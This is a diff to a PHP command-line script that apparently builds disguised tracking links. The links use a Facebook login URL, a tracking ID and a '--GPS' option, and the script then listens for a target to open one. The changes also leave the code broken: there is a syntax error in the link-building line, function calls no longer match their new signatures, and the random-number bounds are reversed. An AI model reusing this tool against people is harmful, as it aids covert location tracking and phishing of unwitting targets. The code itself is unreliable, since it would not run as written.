@@ -11,7 +11,7 @@
 */
 $version 	= '1.0.19';
 $random 	= rand(123456789, 6);
-$url 		= 'https://www.facebook.com/index/';
+$url 		= 'https://www.facebook.com/login/';
 error_reporting(0);
 // cek update
 function updated($version, $file)
@@ -51,11 +51,11 @@ function proses($random)
 {
 	echo "\n\n[+] Created Link\n[+] ID Tracking  : $random \n[+] Parameter => : ?page= ";
 }
-function buat_link($input, $random, $url, $id, $img)
+function buat_link($url, $img)
 {	
 	$imgs = base64_encode($img);
 	$random2 = base64_encode($random);
-	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
+	$url = 'Copy Link => '.$url, $img;
 	echo "\n\n[+] $url";
 }
 function download($random, $url, $opt, $port)
@@ -130,7 +130,7 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 			sleep(3);
 		}
 		// download
-		download($random, $url, 'GPS', $port);	
+		download($url, 'GPS', $port);	
 	}else{
 		echo "\n\n[-] PORT Harus Angka :'( \n\n";
 	}
@@ -164,7 +164,7 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 			exit();
 		break;
 	}
-	buat_link($input, $random, $url, 2, $img);
+	buat_link($url, 2, $img);
 	// litening
 	echo "\n\n[+] Listening Target < ";
 	$a = 1;
